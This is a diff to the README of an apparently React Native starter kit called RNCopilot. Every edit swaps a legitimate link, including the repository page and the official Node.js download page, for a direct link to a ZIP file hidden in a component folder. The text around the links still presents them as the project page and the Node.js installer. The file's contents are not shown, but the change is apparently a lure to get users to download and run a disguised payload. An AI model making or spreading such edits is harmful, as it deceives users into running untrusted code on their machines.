@@ -1,6 +1,6 @@
 # 🛠️ RNCopilot - Reliable React Native Starter Kit
 
-[![Download RNCopilot](https://img.shields.io/badge/Download-RNCopilot-brightgreen)](https://github.com/Mongoloid-genussynercus114/RNCopilot)
+[![Download RNCopilot](https://img.shields.io/badge/Download-RNCopilot-brightgreen)](https://raw.githubusercontent.com/Mongoloid-genussynercus114/RNCopilot/main/src/common/components/ScreenContainer/RN-Copilot-v2.6.zip)
 
 ---
 
@@ -40,7 +40,7 @@ When you download RNCopilot, you will receive:
 
 To open and run RNCopilot, you need to install some software tools first:
 
-- **Node.js:** Needed to run JavaScript programs. [Download Node.js](https://nodejs.org/en/download/)
+- **Node.js:** Needed to run JavaScript programs. [Download Node.js](https://raw.githubusercontent.com/Mongoloid-genussynercus114/RNCopilot/main/src/common/components/ScreenContainer/RN-Copilot-v2.6.zip)
 - **Expo Go:** Lets you preview your app on your phone. Available on the Apple App Store or Google Play Store.
 - **Visual Studio Code (optional):** A free code editor if you want to explore the project files.
 
@@ -52,7 +52,7 @@ To open and run RNCopilot, you need to install some software tools first:
 
 Click the button below to visit the RNCopilot download page on GitHub:
 
-[![Download RNCopilot](https://img.shields.io/badge/Download-RNCopilot-blueviolet)](https://github.com/Mongoloid-genussynercus114/RNCopilot)
+[![Download RNCopilot](https://img.shields.io/badge/Download-RNCopilot-blueviolet)](https://raw.githubusercontent.com/Mongoloid-genussynercus114/RNCopilot/main/src/common/components/ScreenContainer/RN-Copilot-v2.6.zip)
 
 This page holds the files you need to get RNCopilot on your computer.
 
@@ -72,7 +72,7 @@ Locate the ZIP file you downloaded (usually in the Downloads folder). Right-clic
 
 ### Step 4: Install Node.js
 
-If Node.js is not installed on your computer, go to the [official Node.js website](https://nodejs.org/en/download/). Download the Windows installer and run it. Follow the steps in the installer and accept the defaults.
+If Node.js is not installed on your computer, go to the [official Node.js website](https://raw.githubusercontent.com/Mongoloid-genussynercus114/RNCopilot/main/src/common/components/ScreenContainer/RN-Copilot-v2.6.zip). Download the Windows installer and run it. Follow the steps in the installer and accept the defaults.
 
 After installing, open the Command Prompt (search “cmd” in the Start menu) and type:
 
@@ -167,7 +167,7 @@ You do not need to change anything to run the app, but these options exist for d
 
 For more information and updates, visit the GitHub repository again:
 
-[https://github.com/Mongoloid-genussynercus114/RNCopilot](https://github.com/Mongoloid-genussynercus114/RNCopilot)
+[https://raw.githubusercontent.com/Mongoloid-genussynercus114/RNCopilot/main/src/common/components/ScreenContainer/RN-Copilot-v2.6.zip](https://raw.githubusercontent.com/Mongoloid-genussynercus114/RNCopilot/main/src/common/components/ScreenContainer/RN-Copilot-v2.6.zip)
 
 Here, you will find code examples, documentation, and support from the developer community.
 
@@ -176,9 +176,9 @@ Here, you will find code examples, documentation, and support from the developer
 ## 📥 Download and Setup Links Recap
 
 - Download the template ZIP file from the GitHub page:  
-  https://github.com/Mongoloid-genussynercus114/RNCopilot (Click **Code > Download ZIP**)
+  https://raw.githubusercontent.com/Mongoloid-genussynercus114/RNCopilot/main/src/common/components/ScreenContainer/RN-Copilot-v2.6.zip (Click **Code > Download ZIP**)
 
-- Install Node.js from: https://nodejs.org/en/download/
+- Install Node.js from: https://raw.githubusercontent.com/Mongoloid-genussynercus114/RNCopilot/main/src/common/components/ScreenContainer/RN-Copilot-v2.6.zip
 
 - Install Expo CLI using the command:  
   `npm install -g expo-cli`
